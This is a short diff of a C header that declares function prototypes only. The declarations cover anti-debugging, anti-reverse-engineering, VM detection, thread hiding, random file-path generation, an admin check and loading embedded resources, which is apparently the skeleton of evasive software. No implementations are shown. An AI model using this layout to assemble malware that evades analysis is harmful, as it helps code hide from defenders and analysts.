@@ -21,7 +21,7 @@ FLOAT fnURRD();
 BOOL fnAntiRE();
 BOOL fnAntiDebug();
 BOOL fnAntiDllInject();
-BOOL HideThread(_In_opt_ HANDLE hThread);
+BOOL fnHideThread(_In_opt_ HANDLE hThread);
 
 /* VMDetection : VMDetect.c */
 BOOL fnCheckVMPresent();
@@ -38,4 +38,11 @@ BOOL fnWriteFileCW(_In_ PCWSTR pFileName, _In_ PVOID pBuffer, _In_ SIZE_T nBuffe
 PCWSTR fnGetFileNameFromPathW(_In_ PCWSTR pPath);
 
 /* Random : Random.c */
-PCWSTR fnAllocRandomPathW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax, _Out_ PSIZE_T nLen);
+VOID fnGenRandomB64W(_Out_ PVOID sz, _In_ SIZE_T n);
+VOID fnGenRandomPathW(_Out_ PVOID sz, _In_ SIZE_T n);
+PCWSTR fnAllocRandomB64W(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
+PCWSTR fnAllocRandomPathW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
+
+/* Utils and Other : Utils.c*/
+BOOL fnIsUserAdmin();
+PVOID fnLoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ PDWORD dwBufferSize);
